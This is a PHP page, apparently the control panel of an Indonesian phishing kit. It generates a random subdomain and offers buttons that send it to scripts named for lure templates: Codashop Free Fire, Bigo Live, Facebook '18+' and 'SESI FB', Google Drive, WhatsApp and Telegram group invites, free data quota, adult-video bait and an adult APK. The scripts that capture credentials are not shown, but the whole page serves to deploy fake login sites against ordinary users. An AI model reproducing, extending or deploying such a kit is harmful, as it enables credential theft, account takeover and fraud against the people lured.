<?php
function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Pilih Web</title> 
</head>
<style>
body {
            font-family: 'Roboto', sans-serif;
            background-image: url('https://img.uhdpaper.com/wallpaper/nun-with-tattoo-anime-girl-tongue-out-728@0@j-thumb.jpg?dl');
            background-size: cover;
            background-position: center;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }

.panel {
            background-color: rgba(128, 128, 128, 0.7); /* Semi-transparent gray */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .panel h2 {
            margin-bottom: 25px;
            color: #fff;
        }

        .button-group {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .button-group button {
            background-color: #4a4a4a; /* Dark gray color */
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
            transition: background-color 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
        }

        .button-group button:hover {
            background-color: #636363; /* Slightly lighter gray on hover */
        }
        input[type="file"] {
            background-color: #0074E4;
            color: #FFFFFF;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        </style>
<body>
    <div class="panel">
 <h2>PILIH TAMPILAN DI BAWAH!</h2>

        <div class="button-group">
        <form method="post" action="coda.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                CODASHOP FF
            </button>
            </form>
        <br><br>
        <form method="post" action="bigo.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                BIGO LIVE 
            </button>
            </form>
            <br><br>
            <form method="post" action="dood.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                DOODSTREAM
            </button>
            </form>
        <br><br>
        <form method="post" action="fb.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                FB 18+
            </button>
            </form>
        <br><br>
        <form method="post" action="gg.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GOOGLE DRIVE
            </button>
            </form>
        <br><br>
        <form method="post" action="mess.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GRUP MESSENGER
            </button>
            </form>
        <br><br>
        <form method="post" action="tele.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GRUP TELEGRAM
            </button>
            </form>
        <br><br>
        <form method="post" action="wa1.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GRUP WA1
            </button>
            </form>
        <br><br>
        <form method="post" action="wa2.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GRUP WA2
            </button>
            </form>
        <br><br>
        <form method="post" action="wa3.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                GRUP WA3
            </button>
            </form>
        <br><br>
        <form method="post" action="wa4.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
               GRUP WA4
            </button>
            </form>
        <br><br>
        <form method="post" action="ku1.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                KUOTA GRATIS 1
            </button>
            </form>
        <br><br>
        <form method="post" action="ku2.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                KUOTA GRATIS 2
            </button>
            </form>
        <br><br>
        <form method="post" action="la.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                LANJUT VIDEO 18+
            </button>
            </form>
        <br><br>
        <form method="post" action="lo.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                LOADING VIDEO 18+
            </button>
            </form>
        <br><br>
        <form method="post" action="mp4.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
               MEDIAFIRE MP4
            </button>
            </form>
        <br><br>
        <form method="post" action="zip.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                MEDIAFIRE ZIP
            </button>
            </form>
        <br><br>
        <form method="post" action="non.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                NONTON VIDEO 18+
            </button>
            </form>
        <br><br>
        <form method="post" action="play.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                PLAY VIDEO 18+
            </button>
            </form>
        <br><br>
        <form method="post" action="sesi.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                SESI FB
            </button>
            </form>
        <br><br>
        <form method="post" action="sfile.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                SFILEMOBI
            </button>
            </form>
        <br><br>
        <form method="post" action="sfileku.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                SFILEKU COSTUM NAMA
            </button>
            </form>
        <br><br>
        <form method="post" action="sim.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
               SIMONTOK
            </button>
            </form>
        <br><br>
        <form method="post" action="tur.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                TURNAMEN FF
            </button>
            </form>
        <br><br>
        <form method="post" action="apk.php">
        <input type="hidden" name="subdo" id="subdo" value="<?= $subdomain; ?>">
            <button type="submit" style="font-weight:bold;" name="prosesbuat">
                APK BOKEP
            </button>
            </form>
        <br><br>
        </div>
        
</body> 
</html>